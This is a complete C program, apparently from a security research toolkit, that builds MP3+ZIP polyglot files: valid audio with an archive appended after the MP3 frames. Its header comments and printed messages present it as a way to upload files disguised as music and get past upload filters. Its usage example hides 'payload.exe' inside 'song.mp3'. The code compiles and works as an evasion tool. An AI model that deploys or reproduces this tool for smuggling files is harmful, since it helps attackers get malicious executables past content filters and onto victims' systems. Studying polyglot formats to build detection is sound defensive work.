/*
 * MP3+ZIP Audio/Archive Polyglot Generator
 * =========================================
 *
 * Creates files that are simultaneously:
 * - Valid MP3 audio (plays in media players)
 * - Valid ZIP archive (opens in archive tools)
 *
 * TECHNIQUE:
 * MP3 decoders scan for frame sync markers (0xFFE or 0xFFF) and ignore trailing data.
 * ID3v2 tags at start allow arbitrary data. We place ZIP archive after MP3 frames.
 *
 * STRUCTURE:
 * +-----------------------------+
 * | ID3v2 Tag (optional)        | <- MP3 metadata
 * +-----------------------------+
 * | MP3 Audio Frames            | <- Players decode this
 * +-----------------------------+
 * | ZIP Archive                 | <- Archive tools read from end
 * +-----------------------------+
 *
 * EXPLOITATION:
 * - Upload as "music file" to bypass filters
 * - Extract malicious files from ZIP portion
 * - Audio plays normally, hiding embedded archive
 *
 * ATTRIBUTION:
 * Technique: Common in malware (2010s+)
 * Implementation: POLYGOTTEM Research, 2025
 *
 * COMPILE:
 * gcc -O2 -Wall -o mp3_zip_gen mp3_zip_polyglot.c
 */

#define _POSIX_C_SOURCE 200809L
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include <sys/stat.h>

#define VERSION "1.0.0"
#define MAX_FILES 100

// ID3v2 header structure
#pragma pack(push, 1)
typedef struct {
    char id[3];          // "ID3"
    uint8_t version[2];  // 0x03 0x00 for v2.3
    uint8_t flags;
    uint8_t size[4];     // Synchsafe integer
} ID3v2Header;

// ZIP structures (minimal)
typedef struct {
    uint32_t signature;          // 0x04034b50
    uint16_t version;
    uint16_t flags;
    uint16_t compression;
    uint16_t mod_time;
    uint16_t mod_date;
    uint32_t crc32;
    uint32_t compressed_size;
    uint32_t uncompressed_size;
    uint16_t filename_len;
    uint16_t extra_len;
} ZipLocalFileHeader;

typedef struct {
    uint32_t signature;          // 0x02014b50
    uint16_t version_made;
    uint16_t version_needed;
    uint16_t flags;
    uint16_t compression;
    uint16_t mod_time;
    uint16_t mod_date;
    uint32_t crc32;
    uint32_t compressed_size;
    uint32_t uncompressed_size;
    uint16_t filename_len;
    uint16_t extra_len;
    uint16_t comment_len;
    uint16_t disk_start;
    uint16_t internal_attr;
    uint32_t external_attr;
    uint32_t local_header_offset;
} ZipCentralDirHeader;

typedef struct {
    uint32_t signature;          // 0x06054b50
    uint16_t disk_number;
    uint16_t central_dir_disk;
    uint16_t entries_this_disk;
    uint16_t total_entries;
    uint32_t central_dir_size;
    uint32_t central_dir_offset;
    uint16_t comment_len;
} ZipEndOfCentralDir;
#pragma pack(pop)

// CRC32 table
static const uint32_t crc32_table[256] = {
    0x00000000, 0x77073096, 0xee0e612c, 0x990951ba, 0x076dc419, 0x706af48f,
    0xe963a535, 0x9e6495a3, 0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988,
    0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91, 0x1db71064, 0x6ab020f2,
    0xf3b97148, 0x84be41de, 0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7,
    0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec, 0x14015c4f, 0x63066cd9,
    0xfa0f3d63, 0x8d080df5, 0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172,
    0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b, 0x35b5a8fa, 0x42b2986c,
    0xdbbbc9d6, 0xacbcf940, 0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59,
    0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116, 0x21b4f4b5, 0x56b3c423,
    0xcfba9599, 0xb8bda50f, 0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924,
    0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d, 0x76dc4190, 0x01db7106,
    0x98d220bc, 0xefd5102a, 0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433,
    0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818, 0x7f6a0dbb, 0x086d3d2d,
    0x91646c97, 0xe6635c01, 0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e,
    0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457, 0x65b0d9c6, 0x12b7e950,
    0x8bbeb8ea, 0xfcb9887c, 0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65,
    0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2, 0x4adfa541, 0x3dd895d7,
    0xa4d1c46d, 0xd3d6f4fb, 0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0,
    0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9, 0x5005713c, 0x270241aa,
    0xbe0b1010, 0xc90c2086, 0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f,
    0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4, 0x59b33d17, 0x2eb40d81,
    0xb7bd5c3b, 0xc0ba6cad, 0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a,
    0xead54739, 0x9dd277af, 0x04db2615, 0x73dc1683, 0xe3630b12, 0x94643b84,
    0x0d6d6a3e, 0x7a6a5aa8, 0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1,
    0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe, 0xf762575d, 0x806567cb,
    0x196c3671, 0x6e6b06e7, 0xfed41b76, 0x89d32be0, 0x10da7a5a, 0x67dd4acc,
    0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5, 0xd6d6a3e8, 0xa1d1937e,
    0x38d8c2c4, 0x4fdff252, 0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b,
    0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60, 0xdf60efc3, 0xa867df55,
    0x316e8eef, 0x4669be79, 0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236,
    0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f, 0xc5ba3bbe, 0xb2bd0b28,
    0x2bb45a92, 0x5cb36a04, 0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d,
    0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a, 0x9c0906a9, 0xeb0e363f,
    0x72076785, 0x05005713, 0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38,
    0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21, 0x86d3d2d4, 0xf1d4e242,
    0x68ddb3f8, 0x1fda836e, 0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777,
    0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c, 0x8f659eff, 0xf862ae69,
    0x616bffd3, 0x166ccf45, 0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2,
    0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db, 0xaed16a4a, 0xd9d65adc,
    0x40df0b66, 0x37d83bf0, 0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9,
    0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6, 0xbad03605, 0xcdd70693,
    0x54de5729, 0x23d967bf, 0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94,
    0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d
};

uint32_t calculate_crc32(const uint8_t *data, size_t len) {
    uint32_t crc = 0xFFFFFFFF;
    for (size_t i = 0; i < len; i++) {
        crc = crc32_table[(crc ^ data[i]) & 0xFF] ^ (crc >> 8);
    }
    return ~crc;
}

void get_dos_datetime(uint16_t *dos_time, uint16_t *dos_date) {
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    *dos_time = (t->tm_hour << 11) | (t->tm_min << 5) | (t->tm_sec / 2);
    *dos_date = ((t->tm_year - 80) << 9) | ((t->tm_mon + 1) << 5) | t->tm_mday;
}

// Generate minimal MP3 audio (single frame of silence)
size_t write_minimal_mp3(FILE *out) {
    // MP3 frame header for Layer III, 128 kbps, 44.1kHz, stereo
    // This creates a minimal valid MP3 that plays as silence
    uint8_t mp3_frame[] = {
        // Frame sync + MPEG1 Layer3 + no CRC + 128kbps + 44.1kHz + no padding + stereo
        0xFF, 0xFB, 0x90, 0x00,
        // Minimal frame data (mostly zeros = silence)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };

    // Write ID3v2 header (optional but makes it more compatible)
    ID3v2Header id3 = {
        .id = {'I', 'D', '3'},
        .version = {0x03, 0x00},
        .flags = 0,
        .size = {0, 0, 0, 0}  // No extended header
    };

    fwrite(&id3, sizeof(id3), 1, out);
    fwrite(mp3_frame, 1, sizeof(mp3_frame), out);

    return sizeof(id3) + sizeof(mp3_frame);
}

int create_mp3_zip_polyglot(const char *mp3_path, const char **zip_files,
                            int num_files, const char *output_path) {

    printf("[*] MP3+ZIP Polyglot Generator v%s\n", VERSION);
    printf("[*] Creating audio/archive dual-format file...\n\n");

    FILE *out = fopen(output_path, "wb");
    if (!out) {
        perror("fopen output");
        return -1;
    }

    size_t mp3_size = 0;

    // Phase 1: Write MP3 audio
    if (mp3_path) {
        FILE *mp3 = fopen(mp3_path, "rb");
        if (mp3) {
            uint8_t buffer[4096];
            size_t bytes;
            while ((bytes = fread(buffer, 1, sizeof(buffer), mp3)) > 0) {
                fwrite(buffer, 1, bytes, out);
                mp3_size += bytes;
            }
            fclose(mp3);
            printf("[+] Added MP3 audio: %zu bytes\n", mp3_size);
        }
    } else {
        // Generate minimal MP3
        mp3_size = write_minimal_mp3(out);
        printf("[+] Generated minimal MP3: %zu bytes\n", mp3_size);
    }

    uint32_t zip_start = mp3_size;
    uint32_t current_pos = zip_start;

    // Phase 2: Load files for ZIP
    struct {
        char *filename;
        uint8_t *data;
        size_t size;
        uint32_t crc;
        uint32_t offset;
    } files[MAX_FILES];

    memset(files, 0, sizeof(files));

    for (int i = 0; i < num_files; i++) {
        FILE *fp = fopen(zip_files[i], "rb");
        if (!fp) {
            fprintf(stderr, "[!] Cannot open: %s\n", zip_files[i]);
            fclose(out);
            for (int j = 0; j < i; j++) {
                free(files[j].data);
                free(files[j].filename);
            }
            return -1;
        }

        fseek(fp, 0, SEEK_END);
        files[i].size = ftell(fp);
        fseek(fp, 0, SEEK_SET);

        files[i].data = malloc(files[i].size);
        if (fread(files[i].data, 1, files[i].size, fp) != files[i].size) {
            fprintf(stderr, "[!] Read error: %s\n", zip_files[i]);
        }
        fclose(fp);

        files[i].filename = strdup(zip_files[i]);
        files[i].crc = calculate_crc32(files[i].data, files[i].size);

        printf("[+] Added to ZIP: %s (%zu bytes)\n", zip_files[i], files[i].size);
    }

    // Phase 3: Write ZIP structure
    uint16_t dos_time, dos_date;
    get_dos_datetime(&dos_time, &dos_date);

    // Write local file headers and data
    for (int i = 0; i < num_files; i++) {
        files[i].offset = current_pos;

        ZipLocalFileHeader lfh = {
            .signature = 0x04034b50,
            .version = 20,
            .flags = 0,
            .compression = 0,
            .mod_time = dos_time,
            .mod_date = dos_date,
            .crc32 = files[i].crc,
            .compressed_size = files[i].size,
            .uncompressed_size = files[i].size,
            .filename_len = strlen(files[i].filename),
            .extra_len = 0
        };

        fwrite(&lfh, sizeof(lfh), 1, out);
        fwrite(files[i].filename, 1, lfh.filename_len, out);
        fwrite(files[i].data, 1, files[i].size, out);

        current_pos += sizeof(lfh) + lfh.filename_len + files[i].size;
    }

    uint32_t central_dir_start = current_pos;

    // Write central directory
    for (int i = 0; i < num_files; i++) {
        ZipCentralDirHeader cdh = {
            .signature = 0x02014b50,
            .version_made = 20,
            .version_needed = 20,
            .flags = 0,
            .compression = 0,
            .mod_time = dos_time,
            .mod_date = dos_date,
            .crc32 = files[i].crc,
            .compressed_size = files[i].size,
            .uncompressed_size = files[i].size,
            .filename_len = strlen(files[i].filename),
            .extra_len = 0,
            .comment_len = 0,
            .disk_start = 0,
            .internal_attr = 0,
            .external_attr = 0x20,
            .local_header_offset = files[i].offset
        };

        fwrite(&cdh, sizeof(cdh), 1, out);
        fwrite(files[i].filename, 1, cdh.filename_len, out);

        current_pos += sizeof(cdh) + cdh.filename_len;
    }

    uint32_t central_dir_size = current_pos - central_dir_start;

    // Write end of central directory
    ZipEndOfCentralDir eocd = {
        .signature = 0x06054b50,
        .disk_number = 0,
        .central_dir_disk = 0,
        .entries_this_disk = num_files,
        .total_entries = num_files,
        .central_dir_size = central_dir_size,
        .central_dir_offset = central_dir_start,
        .comment_len = 0
    };

    fwrite(&eocd, sizeof(eocd), 1, out);

    printf("\n[+] ZIP archive complete: %u bytes\n", current_pos - zip_start);

    fclose(out);

    // Cleanup
    for (int i = 0; i < num_files; i++) {
        free(files[i].data);
        free(files[i].filename);
    }

    printf("\n");
    printf("╔══════════════════════════════════════════════════════════════╗\n");
    printf("║  MP3+ZIP Polyglot Created Successfully!                     ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n");
    printf("\n");
    printf("  File: %s\n\n", output_path);
    printf("  Test as MP3:\n");
    printf("    mpg123 %s\n", output_path);
    printf("    vlc %s\n\n", output_path);
    printf("  Test as ZIP:\n");
    printf("    unzip -l %s\n", output_path);
    printf("    unzip %s\n\n", output_path);
    printf("  Audio plays normally while hiding embedded files!\n\n");
    printf("  ⚠ WARNING: Effective filter bypass technique!\n\n");

    return 0;
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("MP3+ZIP Audio/Archive Polyglot Generator\n\n");
        printf("Usage: %s [OPTIONS]\n\n", argv[0]);
        printf("Options:\n");
        printf("  --mp3 FILE        Source MP3 (or generate minimal)\n");
        printf("  --add FILE        Add file to ZIP (can specify multiple)\n");
        printf("  --output FILE     Output polyglot file\n\n");
        printf("Example:\n");
        printf("  %s --add payload.exe --add data.txt --output song.mp3\n\n", argv[0]);
        printf("Creates an MP3 that plays audio AND contains a ZIP archive!\n");
        return 1;
    }

    const char *mp3_file = NULL;
    const char *zip_files[MAX_FILES];
    int num_zip_files = 0;
    const char *output = "polyglot.mp3";

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--mp3") == 0 && i + 1 < argc) {
            mp3_file = argv[++i];
        } else if (strcmp(argv[i], "--add") == 0 && i + 1 < argc) {
            if (num_zip_files < MAX_FILES) {
                zip_files[num_zip_files++] = argv[++i];
            }
        } else if (strcmp(argv[i], "--output") == 0 && i + 1 < argc) {
            output = argv[++i];
        }
    }

    if (num_zip_files == 0) {
        fprintf(stderr, "Error: No files to add to ZIP\n");
        return 1;
    }

    return create_mp3_zip_polyglot(mp3_file, zip_files, num_zip_files, output);
}
